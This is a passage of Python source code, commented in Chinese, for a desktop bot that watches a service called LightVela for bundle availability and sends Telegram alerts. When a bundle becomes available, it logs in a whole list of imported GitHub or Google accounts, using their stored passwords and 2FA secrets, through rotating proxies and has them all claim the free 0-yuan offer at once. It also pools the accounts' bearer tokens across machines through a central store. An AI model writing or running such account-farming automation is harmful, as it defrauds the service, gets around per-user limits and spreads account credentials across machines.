        ok, info = tg_send(text, proxy_url=self.proxy)
        self.tg_last_result = ("成功：" if ok else "失败：") + info
        self.log(("📨 TG 推送" + ("成功" if ok else "失败")) + "：" + info)
        return ok

    def stop_push(self):
        """老大点「停止推送」→ 只停推送，监控继续轮询。"""
        self.push_stopped = True
        self.log("🔕 已停止推送（监控仍在轮询，只是不再发 TG；已推 %d 条）" % self.push_count)

    def _maybe_push(self):
        """只要最近一次查到「任一套餐可买」，就按 push_interval（默认 5 秒）持续推送，
        直到点「停止推送」或状态变回售罄。"""
        if self.push_stopped or not self.tg_enabled or not self.last_avail:
            return False
        now = time.time()
        if now - self.last_push_at < self.push_interval:
            return False
        self.last_push_at = now
        self.push_count += 1
        st_p, st_f = self.last_avail
        ok = self._notify(build_available_text(
            self.bundle, self.bundle_fallback, st_p, st_f,
            accounts_n=len(self.accounts), auto_rush=self.auto_rush,
            seq=self.push_count))
        # ★ Telegram 限流（429）：退避 60 秒再试，别把「5 秒一条」打成失败死循环
        if not ok and "429" in (self.tg_last_result or ""):
            self.last_push_at = time.time() + 60
            self.log("⏳ TG 限流（429），暂停推送 60 秒后再试")
        return ok

    def _notify_available(self, st_p, st_f):
        """立即推一条（真实格式）。"""
        return self._notify(build_available_text(
            self.bundle, self.bundle_fallback, st_p, st_f,
            accounts_n=len(self.accounts), auto_rush=self.auto_rush))

    def _notify_soldout(self, st_p, st_f):
        """从"可买"退回"售罄" → 推一条，避免你以为还能抢。"""
        lines = ["<b>⛔ LightVela 又售罄了（已停止推送）</b>"]
        if st_p:
            lines.append("· 主套餐 %s：%s" % (self.bundle, st_p))
        if self.bundle_fallback and st_f:
            lines.append("· 降级套餐 %s：%s" % (self.bundle_fallback, st_f))
        lines.append("")
        lines.append("时间：%s" % time.strftime("%Y-%m-%d %H:%M:%S"))
        mid = center_machine_id()
        if mid:
            lines.append("机器：%s" % mid)
        lines.append("本轮共推送 %d 条" % self.push_count)
        self._notify("\n".join(lines))

    # --- 日志（与 Job 同款）---
    def log(self, msg):
        with self.lock:
            self.logs.append("[%s] %s" % (time.strftime("%H:%M:%S"), msg))
            if len(self.logs) > 4000:
                del self.logs[:1500]

    def stop(self):
        self.stop_flag = True
        self.log("⏹ 收到停止指令")
        # 若已进入批量阶段，顺便停掉批次任务
        try:
            if self.api and self.api.job:
                self.api.job.stop()
        except Exception:
            pass

    def _stopped(self):
        return self.stop_flag

    # --- 阶段 1：首号登录检测 ---
    def _save_one_token(self, name, token):
        """把一个令牌写进本地令牌库（合并旧内容，不覆盖别人）。失败不影响监控。"""
        try:
            p = token_path()
            old = {}
            if os.path.isfile(p):
                try:
                    raw = json.load(open(p, encoding="utf-8"))
                    old = raw if isinstance(raw, dict) else {}
                except Exception:
                    old = {}
            old[name] = {"token": token, "ts": int(time.time())}
            write_tokens(old)
            return True
        except Exception as e:
            self.log("⚠ 存令牌失败：%s" % e)
            return False

    def _find_saved_token(self, acc, name):
        """按「本地令牌库 → 数据中心」顺序找一个已存令牌。
        返回 (token, 来源说明)；都没有返回 ("", "")。"""
        try:
            local = load_tokens()
        except Exception:
            local = {}
        t = local.get(name) or local.get(acc.get("email", "")) or ""
        if t:
            return t, "本地令牌库"
        # 本地没有 → 问数据中心（查全量、不分机器，可跨机复用）
        try:
            t = center_get_token(name) or ""
        except Exception:
            t = ""
        if t:
            return t, "数据中心"
        return "", ""

    def _detect_first(self):
        acc = self.accounts[0]
        name = acc.get("login") or acc.get("email") or "#1"
        tag = "[监控·首号] %s" % name
        if not acc["ok"]:
            self.log(tag + " ❌ 第一个账号格式错误：" + acc.get("err", ""))
            return False
        px = proxy_of(acc, self.proxy)

        # ★ 2026-10-27 新增：勾了「复用已存令牌」→ 先找令牌，找到且没失效就直接用，不登录
        if self.use_saved:
            token, src = self._find_saved_token(acc, name)
            if token:
                self.log(tag + " 🔑 复用已存令牌（来自%s），跳过登录" % src)
                s = api_session(token, px)
                state, have = probe_token(s)
                if state != "dead":
                    self.log(tag + " ✅ 令牌可用（订阅状态=%s），无需重新登录"
                             % (state or "unknown"))
                    self.first_token = token
                    self.first_token_name = name
                    self.local_tokens[name] = token
                    return True
                self.log(tag + " ⚠ 已存令牌已失效（401/403），改走重新登录 ...")
            else:
                self.log(tag + " 本地和数据中心都没有令牌，按方案甲退回登录（登录后自动保存）")

        self.log(tag + " 启动检测：开始授权登录 ...")
        t0 = time.time()
        try:
            if acc.get("provider") == "google":
                token = google_login_retry(acc["email"], acc["password"], acc.get("recovery", ""),
                                           px, log=lambda m: self.log(tag + m))
            else:
                token = gh_login_retry(acc["login"], acc["password"], acc["tfa"], px,
                                       log=lambda m: self.log(tag + m))
        except Exception as e:
            self.log(tag + " ❌ 登录异常：%s" % e)
            return False
        if not token:
            self.log(tag + " ❌ 登录失败（未拿到凭证）")
            return False
        self.log(tag + " ✅ 登录成功（%.1fs）Bearer=%s…" % (time.time() - t0, token[:12]))
        # 检测凭证是否可用（probe_token 看是否 dead）
        s = api_session(token, px)
        state, have = probe_token(s)
        if state == "dead":
            self.log(tag + " ❌ 凭证失效（401/403），流程不可用")
            return False
        self.log(tag + " ✅ 凭证可用（订阅状态=%s）" % (state or "unknown"))
        self.first_token = token
        self.first_token_name = name
        # ★ 2026-10-27 新增：复用模式下，刚登录到的令牌要存下来，下次监控就不用再登了
        if self.use_saved:
            self.local_tokens[name] = token
            if self._save_one_token(name, token):
                self.log(tag + " 💾 令牌已存本地（下次监控可直接复用）")
            try:
                if center_push_token(name, token):
                    self.log(tag + " ☁ 令牌已上报数据中心（其他机器也能复用）")
            except Exception:
                pass
        return True

    # --- 主循环 ---
    def run(self):
        self.log("===== 监控启动 | 账号 %d 个 | 间隔 %ds | 并发 %d | 目标 %s | 复用令牌 %s ====="
                 % (len(self.accounts), self.interval, self.parallel, DEFAULT_BUNDLE,
                    "开" if self.use_saved else "关"))
        try:
            # 阶段 1：首号检测
            self.phase = "detect"
            if not self._detect_first():
                self.summary = "启动检测失败：首号无法注册/凭证不可用"
                self.log("❌ " + self.summary)
                self.done = True
                return
            self.log("✅ 启动检测通过，开始轮询 bundles 状态 ...")

            # 阶段 2：轮询
            self.phase = "polling"
            triggered = False
            self.saw_available = False
            while not self._stopped():
                self.last_check = time.time()
                # 按订阅策略判断是否有可购买的套餐：主套餐可买，或主售罄但降级可买
                # ★ 2026-10-27 修复：查询必须带首号凭证！不带令牌平台回 401，状态恒为空，
                #   「可买」判断永远不成立 → 监控永远不会触发（老版就是这个毛病）。
                st_p = bundle_state(self.proxy, self.bundle, self.first_token)
                st_f = (bundle_state(self.proxy, self.bundle_fallback, self.first_token)
                        if self.bundle_fallback else None)
                avail = (st_p == "AVAILABLE") or bool(self.bundle_fallback and st_f == "AVAILABLE")
                known = (st_p is not None) or bool(self.bundle_fallback and st_f is not None)

                if avail:
                    which = []
                    if st_p == "AVAILABLE":
                        which.append("主套餐 " + self.bundle)
                    if self.bundle_fallback and st_f == "AVAILABLE":
                        which.append("降级套餐 " + self.bundle_fallback)
                    self.last_state = " + ".join(which) + " 可买"
                    self.saw_available = True
                    self.tg_state = "AVAILABLE"
                    # 记住"现在可买"，让等待期间的秒级检查也能继续推
                    self.last_avail = (st_p, st_f)
                    self.log("🎯 轮询：" + self.last_state
                             + ("（每 %.0f 秒推送一次，点「停止推送」才停）" % self.push_interval
                                if not self.push_stopped else "（推送已停止）"))
                    self._maybe_push()
                    if self.auto_rush:
                        triggered = True
                        break
                else:
                    if known:
                        self.last_avail = None
                        if self.tg_state == "AVAILABLE" and not self.push_stopped:
                            self.tg_state = "SOLD_OUT"
                            self.log("⛔ 轮询：又售罄了 → 停止推送并告知")
                            self._notify_soldout(st_p, st_f)
                        elif self.tg_state is None:
                            self.tg_state = "SOLD_OUT"
                    self.last_state = st_p
                    if not known:
                        self.log("⚠ 轮询：套餐状态查不到（令牌失效或网络抖动），下一轮再试")
                    else:
                        self.log("轮询：%s = %s（降级 %s = %s）"
                                 % (self.bundle, st_p, self.bundle_fallback or '-', st_f or '-'))
                # 可被打断地等待 interval 秒；等待期间每秒检查一次是否该推
                # （这样即使轮询间隔设成 30 秒，推送仍能保持 5 秒一条）
                for _ in range(int(self.interval)):
                    if self._stopped():
                        break
                    time.sleep(1)
                    self._maybe_push()
            if self._stopped() and not triggered:
                if getattr(self, "saw_available", False):
                    self.summary = "监控已手动停止（期间已推送放货通知，未自动开抢）"
                else:
                    self.summary = "监控已手动停止（尚未放货）"
                self.log(self.summary)
                self.done = True
                return

            # 阶段 3：触发并发批次（全部导入账号，含第一个）
            self.phase = "rushing"
            self.log("===== 触发批量：对全部 %d 个导入账号并发 注册→存凭证→买0元 ====="
                     % len(self.accounts))
            job = Job(self.accounts, self.proxy, "rush",
                      interval=1.0, duration=600.0, use_saved=self.use_saved,
                      bundle=self.bundle, bundle_fallback=self.bundle_fallback, parallel=self.parallel)
            # ★ 2026-10-27 修复旧 BUG：原来把 abort_if_soldout=True 当构造参数传，
            #   但 Job.__init__ 根本没有这个参数 → 监控一触发自动开抢就抛
            #   「unexpected keyword argument 'abort_if_soldout'」，批量根本跑不起来。
            #   改成构造后赋值（Job.__init__ 里本来就初始化了这个字段）。
            job.abort_if_soldout = True
            # ★ 2026-10-27 新增：复用模式下把已知令牌全部预载进批次，
            #   否则监控触发的抢单还是每个号重新登录一次（老版就是写死 use_saved=False）。
            if self.use_saved:
                try:
                    job.tokens = load_tokens()
                except Exception:
                    job.tokens = {}
                # 首号刚刚验过的令牌直接塞进去（连数据中心都不用问）
                if self.first_token and self.first_token_name:
                    job.tokens[self.first_token_name] = self.first_token
                for _k, _v in (self.local_tokens or {}).items():
                    if _k and _v:
                        job.tokens[_k] = _v
                job.log("♻ 复用已存令牌：已预载 %d 个（缺令牌的号按方案甲退回登录并保存）"
                        % len(job.tokens))
            # 挂到 api.job，UI 的 poll() 会自动渲染表格与日志
            self.api.job = job
            threading.Thread(target=job.run, daemon=True).start()
            # 等批次跑完（monitor 线程本就是后台）
            while not self._stopped() and not job.done:
                time.sleep(0.5)
            self.phase = "done"
            ok = sum(1 for r in job.rows if r["ok"])
            self.summary = "放货批量完成：%d/%d 成功（监控结束）" % (ok, len(job.rows))
            self.log("===== " + self.summary + " =====")
            # 批次结果也推一条（人在外面时最想知道这个）
            self._notify("<b>📦 LightVela 抢单结束</b>\n成功 <b>%d</b> / %d 个账号\n时间：%s%s"
                         % (ok, len(job.rows), time.strftime("%Y-%m-%d %H:%M:%S"),
                            ("\n机器：" + center_machine_id()) if center_machine_id() else ""))
        except Exception as e:
            self.log("监控异常：%s" % e)
            self.summary = "监控异常：" + str(e)
        finally:
            self.done = True


# ---------------- 给界面的门面 ----------------
class Api(object):
    """每个方法都 try/except 返回 {'ok':bool,...}，异常不越过桥。"""
    def __init__(self):
        self.window = None
        self.job = None
        self.thread = None
        self.monitor = None
        self.thread_mon = None
        self._last_accounts = []
        # ★ 2026-10-27：「推送测试」= 模拟放货持续推送（独立于监控，不需要登录账号）
        self.test_push_thread = None
        self.test_push_stop_flag = False
        self.test_push_count = 0
        self.test_push_interval = 5
        self.test_push_last = ""

    # 解析预览
    def parse(self, text):
        try:
            accs = parse_accounts(text)
            good = [a for a in accs if a["ok"]]
            return {"ok": True, "total": len(accs), "valid": len(good),
                    "invalid": len(accs) - len(good),
                    "sample": [{"idx": a["idx"], "login": a.get("login") or a.get("email") or "",
                                "ok": a["ok"], "err": a.get("err", "")} for a in accs]}
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    # 读 txt
    def read_file(self, path):
        try:
            if not path:
                return {"ok": False, "error": "未选择文件"}
            if isinstance(path, (list, tuple)):
                path = path[0]
            with open(path, "r", encoding="utf-8", errors="replace") as f:
                return {"ok": True, "text": f.read(), "path": str(path)}
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    # 选文件
    def pick_file(self):
        try:
            import webview
            res = self.window.create_file_dialog(
                webview.OPEN_DIALOG, allow_multiple=False,
                file_types=("文本文件 (*.txt)", "所有文件 (*.*)"))
            if not res:
                return {"ok": False, "error": "已取消"}
            p = res[0] if isinstance(res, (list, tuple)) else res
            return self.read_file(p)
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    def normalize_proxy(self, ptype, host, port="", user="", pw=""):
        try:
            return {"ok": True, "proxy": proxy_from_parts(ptype, host, port, user, pw)}
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    def test_proxy(self, ptype, host, port="", user="", pw=""):
        try:
            px = proxy_from_parts(ptype, host, port, user, pw)
            if not px:
                return {"ok": False, "error": "请先填写代理地址与端口"}
            ips = []
            for _ in range(3):
                # ★ 每次新建会话 = 新连接，才能看出池子是否轮换
                s = new_session(px)
                t = ""
                for url in ("https://api.ipify.org", "https://icanhazip.com"):
                    try:
                        t = s.get(url, timeout=25).text.strip()
                        if t and len(t) < 40 and "<" not in t:
                            break
                    except Exception:
                        t = ""
                try:
                    s.close()
                except Exception:
                    pass
                if t:
                    ips.append(t)
            if not ips:
                return {"ok": False, "error": "没取到出口 IP（代理不通？）"}
            return {"ok": True, "proxy": px, "ips": ips, "rotate": len(set(ips)) > 1}
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    def start(self, text, proxy, mode, interval, duration, use_saved,
              parallel=1, flow_rush=True, bot_prefix="agent",
              bot_retry=3, deploy_retry=3, skip_verify=False, bundle_strategy="launch_ai"):
        try:
            if self.job and not self.job.done:
                return {"ok": False, "error": "已有任务在跑"}
            accs = parse_accounts(text)
            if not accs:
                return {"ok": False, "error": "没有账号（请粘贴或导入 txt）"}
            self._last_accounts = accs
            _primary, _fallback = resolve_bundle_strategy(bundle_strategy)
            job = Job(accs, upgrade_socks_scheme(proxy), mode,
                      interval=interval, duration=duration, use_saved=use_saved,
                      parallel=parallel, flow_rush=flow_rush, bot_prefix=bot_prefix,
                      bot_retry=bot_retry, deploy_retry=deploy_retry,
                      skip_verify=skip_verify, bundle=_primary, bundle_fallback=_fallback)
            if use_saved:
                p = token_path()
                if os.path.isfile(p):
                    job.tokens = load_tokens()
                    job.log("已载入 %d 个已存令牌（%s）" % (len(job.tokens), p))
                else:
                    job.log("⚠ 没有令牌文件（%s），请先跑一次预登录" % p)
            self.job = job
            self.thread = threading.Thread(target=job.run, daemon=True)
            self.thread.start()
            return {"ok": True}
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    def stop(self):
        try:
            if self.job:
                self.job.stop()
                return {"ok": True}
            return {"ok": False, "error": "没有在跑的任务"}
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    # ---------------- 放货监控 ----------------
    def monitor_start(self, text, proxy, interval, parallel, bundle_strategy="launch_ai",
                      auto_rush=False, use_saved=False):
        try:
            if self.monitor and not self.monitor.done:
                return {"ok": False, "error": "监控已在运行"}
            if self.job and not self.job.done:
                return {"ok": False, "error": "已有任务在跑，请先停止"}
            accs = parse_accounts(text)
            if not accs:
                return {"ok": False, "error": "没有账号（请粘贴或导入 txt）"}
            self.job = None   # 清掉上一次批次残留，避免轮询阶段显示旧表格
            _primary, _fallback = resolve_bundle_strategy(bundle_strategy)
            self.monitor = Monitor(accs, upgrade_socks_scheme(proxy), interval, parallel, self,
                                   bundle=_primary, bundle_fallback=_fallback,
                                   auto_rush=auto_rush, use_saved=use_saved)
            # ★ 2026-10-27 修复：策略日志改到 Monitor 建好之后再写。
            #   原来在创建前调 log_global，那时 self.monitor 还是 None，这行其实一直没打出来。
            if _fallback:
                self.monitor.log("监控策略：优先 %s，发满 20 发未成自动改抢 %s"
                                 % (_primary, _fallback))
            else:
                self.monitor.log("监控策略：只抢 %s（未配降级套餐）" % _primary)
            self.monitor.log("复用已存令牌：%s"
                             % ("开（首号检测和抢单批次都优先用已存令牌，不重复登录）"
                                if use_saved else "关（每个号都会登录一次）"))
            self.thread_mon = threading.Thread(target=self.monitor.run, daemon=True)
            self.thread_mon.start()
            return {"ok": True}
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    def log_global(self, msg):
        """没有任务在跑时也能往界面日志里写一句（借用 monitor 的日志容器）。"""
        try:
            if self.monitor:
                self.monitor.log(msg)
        except Exception:
            pass

    def monitor_stop(self):
        try:
            if self.monitor and not self.monitor.done:
                self.monitor.stop()
                return {"ok": True}
            return {"ok": False, "error": "没有运行中的监控"}
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    def monitor_stop_push(self):
        """统一「停止推送」：真实监控推送 + 测试模拟推送，一起停。"""
        try:
            stopped = []
            if self.monitor and not self.monitor.done:
                self.monitor.stop_push()
                stopped.append("监控推送")
            if self.test_push_thread and self.test_push_thread.is_alive():
                self.test_push_stop_flag = True
                stopped.append("测试推送")
            if not stopped:
                return {"ok": False, "error": "当前没有在推送"}
            return {"ok": True, "stopped": stopped, "pushed": self.test_push_count}
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    def monitor_status(self):
        try:
            tp = self.tg_test_push_status()
            tp = {"test_push_running": tp.get("running", False),
                  "test_push_count": tp.get("count", 0),
                  "test_push_interval": tp.get("interval", 5),
                  "test_push_last": tp.get("last", "")}
            if not self.monitor:
                base = {"ok": True, "running": False, "active": False}
                base.update(tp)
                return base
            m = self.monitor
            res = {"ok": True, "running": not m.done, "active": True,
                   "phase": m.phase, "last_state": m.last_state,
                   "last_check": m.last_check, "summary": m.summary, "done": m.done,
                   "auto_rush": m.auto_rush, "tg_state": m.tg_state,
                   "use_saved": m.use_saved,
                   "tg_result": m.tg_last_result,
                   "push_count": m.push_count, "push_stopped": m.push_stopped,
                   "push_interval": m.push_interval}
            res.update(tp)
            return res
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    # ---------------- Telegram 推送配置 ----------------
    def tg_get(self):
        try:
            cfg = load_tg_config()
            tok = cfg.get("token") or ""
            # 令牌打码返回（面板上只显示尾巴，避免截图外泄；要改就整段重填）
            masked = (tok[:8] + "…" + tok[-4:]) if len(tok) > 14 else ("已填" if tok else "")
            return {"ok": True, "token_masked": masked, "has_token": bool(tok),
                    "chat_id": cfg.get("chat_id") or "", "enabled": bool(cfg.get("enabled", True)),
                    "path": tg_config_path()}
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    def tg_set(self, token, chat_id, enabled=True):
        """保存机器人配置。token 传空字符串 = 保留原令牌（只改会话ID时用）。"""
        try:
            old = load_tg_config()
            tok = (token or "").strip() or (old.get("token") or "")
            cid = (chat_id or "").strip()
            if not tok:
                return {"ok": False, "error": "机器人令牌不能为空"}
            if not cid:
                return {"ok": False, "error": "会话ID不能为空"}
            ok, info = save_tg_config(tok, cid, enabled)
            if not ok:
                return {"ok": False, "error": info}
            return {"ok": True, "path": info}
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    def tg_test(self, proxy="", interval=5):
        """「推送测试」= 模拟「现在可以买任意套餐」，每隔 interval 秒推一条，
        一直推到你点「停止推送」为止。

        ★ 与真实监控完全独立：不需要登录账号、不需要开监控。
        ★ 内容由 build_available_text 生成，和真实放货通知同一个函数，只是末尾多一行测试标记。
        """
        try:
            cfg = load_tg_config()
            if not (cfg.get("token") and cfg.get("chat_id")):
                return {"ok": False, "error": "还没保存机器人令牌或会话ID"}
            if self.test_push_thread and self.test_push_thread.is_alive() \
               and not self.test_push_stop_flag:
                return {"ok": False, "error": "测试推送正在跑，先点「停止推送」"}
            self.test_push_stop_flag = False
            self.test_push_count = 0
            self.test_push_last = ""
            self.test_push_interval = max(1, int(interval or 5))
            px = upgrade_socks_scheme(proxy) if (proxy or "").strip() else ""
            self.test_push_thread = threading.Thread(
                target=self._test_push_loop, args=(self.test_push_interval, px), daemon=True)
            self.test_push_thread.start()
            return {"ok": True, "interval": self.test_push_interval}
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    def _test_push_loop(self, interval, px):
        """后台循环：每 interval 秒推一条「放货了」，直到 test_push_stop_flag 置位。"""
        seq = 0
        try:
            while not self.test_push_stop_flag:
                seq += 1
                text = build_available_text(
                    BUNDLE_LAUNCH_AI, BUNDLE_LAUNCH,
                    "AVAILABLE", "AVAILABLE",     # 模拟：两个套餐都能买
                    accounts_n=0, auto_rush=False, seq=seq, test=True)
                ok, info = tg_send(text, proxy_url=px or None)
                self.test_push_count = seq
                self.test_push_last = ("成功：" if ok else "失败：") + info
                # 被 TG 限流就退避久一点，别硬刷
                wait = 60 if (not ok and "429" in (info or "")) else interval
                for _ in range(int(wait)):
                    if self.test_push_stop_flag:
                        break
                    time.sleep(1)
        except Exception:
            pass

    def tg_test_push_status(self):
        try:
            running = bool(self.test_push_thread and self.test_push_thread.is_alive()
                           and not self.test_push_stop_flag)
            return {"ok": True, "running": running, "count": self.test_push_count,
                    "interval": self.test_push_interval, "last": self.test_push_last}
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    # ---------------- 部署指令（界面可编辑，全流程部署时发送给机器人）----------------
    def deploy_msg_get(self):
        try:
            p = deploy_msg_path()
            return {"ok": True, "text": deploy_msg(),
                    "path": p, "saved": os.path.isfile(p)}
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    def deploy_msg_set(self, text):
        try:
            t = (text or "").strip()
            if not t:
                return {"ok": False, "error": "部署命令不能为空"}
            p = save_deploy_msg(t)
            return {"ok": True, "path": p, "len": len(t)}
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    def deploy_msg_reset(self):
        try:
            return {"ok": True, "text": reset_deploy_msg()}
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    def poll(self):
        try:
            # 监控优先：有监控在跑（或刚跑完、留着批次结果），展示监控视图
            if self.monitor and (not self.monitor.done or self.job):
                m = self.monitor
                job = self.job
                logs = list(m.logs)
                rows = []
                running = not m.done
                if job:
                    logs = logs + list(job.logs)
                    rows = [dict(r) for r in job.rows]
                    running = running or (not job.done)
                return {"ok": True,
                        "logs": logs, "rows": rows,
                        "running": running,
                        "done": (m.done and (not job or job.done)),
                        "summary": (job.summary if job else m.summary),
                        "monitor": {"running": not m.done, "phase": m.phase,
                                    "last_state": m.last_state,
                                    "last_check": m.last_check,
                                    "summary": m.summary,
                                    "bundle": m.bundle,
                                    "bundle_fallback": m.bundle_fallback}}
            # 无监控：走原逻辑
            if not self.job:
                return {"ok": True, "logs": [], "rows": [], "done": True, "summary": "", "running": False}
            snap = self.job.snapshot()
            snap["ok"] = True
            snap["running"] = not snap["done"]
            return snap
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e),
                    "logs": [], "rows": [], "done": True, "running": False}

    def export(self, which):
        try:
            if not self.job:
                return {"ok": False, "error": "还没有任务结果"}
            lines = self.job.export_text(which)
            if not lines:
                return {"ok": False, "error": "没有符合条件可导出的账号"}
            import webview
            name = {"all": "accounts-all", "ok": "accounts-ok", "fail": "accounts-fail"}[which]
            res = self.window.create_file_dialog(
                webview.SAVE_DIALOG, save_filename="%s-%s.txt" % (name, time.strftime("%Y%m%d-%H%M")))
            if not res:
                return {"ok": False, "error": "已取消"}
            p = res[0] if isinstance(res, (list, tuple)) else res
            with open(p, "w", encoding="utf-8") as f:
                f.write("\n".join(lines) + "\n")
            return {"ok": True, "path": str(p), "count": len(lines), "text": "\n".join(lines)}
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    def export_text(self, which):
        try:
            if not self.job:
                return {"ok": False, "error": "还没有任务结果"}
            lines = self.job.export_text(which)
            if not lines:
                return {"ok": False, "error": "没有符合条件可导出的账号"}
            return {"ok": True, "count": len(lines), "text": "\n".join(lines)}
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    # ---------------- 凭证（令牌库）导出 / 导入 ----------------
    def tokens_info(self):
        try:
            p = token_path()
            d = load_tokens()
            return {"ok": True, "count": len(d), "path": p,
                    "exists": os.path.isfile(p)}
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    def export_tokens(self):
        try:
            p = token_path()
            if not os.path.isfile(p):
                return {"ok": False, "error": "还没有凭证文件（%s）" % p}
            raw = json.load(open(p, encoding="utf-8"))
            if not isinstance(raw, dict) or not raw:
                return {"ok": False, "error": "凭证文件是空的"}
            import webview
            res = self.window.create_file_dialog(
                webview.SAVE_DIALOG,
                save_filename="lv-tokens-%s.json" % time.strftime("%Y%m%d-%H%M"))
            if not res:
                return {"ok": False, "error": "已取消"}
            dst = res[0] if isinstance(res, (list, tuple)) else res
            with open(dst, "w", encoding="utf-8") as f:
                json.dump(raw, f, ensure_ascii=False, indent=2)
            return {"ok": True, "path": str(dst), "count": len(raw)}
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}

    def import_tokens(self):
        """导入凭证：与本地【合并】，同一账号【时间新的赢】。"""
        try:
            import webview
            res = self.window.create_file_dialog(
                webview.OPEN_DIALOG, allow_multiple=False,
                file_types=("凭证文件 (*.json)", "所有文件 (*.*)"))
            if not res:
                return {"ok": False, "error": "已取消"}
            src = res[0] if isinstance(res, (list, tuple)) else res
            with open(src, "r", encoding="utf-8", errors="replace") as f:
                incoming = json.load(f)
            if not isinstance(incoming, dict):
                return {"ok": False, "error": "文件格式不对（应该是一个 JSON 对象）"}
            local = {}
            p = token_path()
            if os.path.isfile(p):
                try:
                    local = json.load(open(p, encoding="utf-8")) or {}
                except Exception:
                    local = {}
            merged, added, updated = merge_tokens(local, incoming)
            if not merged:
                return {"ok": False, "error": "这份文件里没有可用的凭证"}
            write_tokens(merged)
            return {"ok": True, "path": str(src), "added": added,
                    "updated": updated, "total": len(merged)}
        except Exception as e:
            return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}
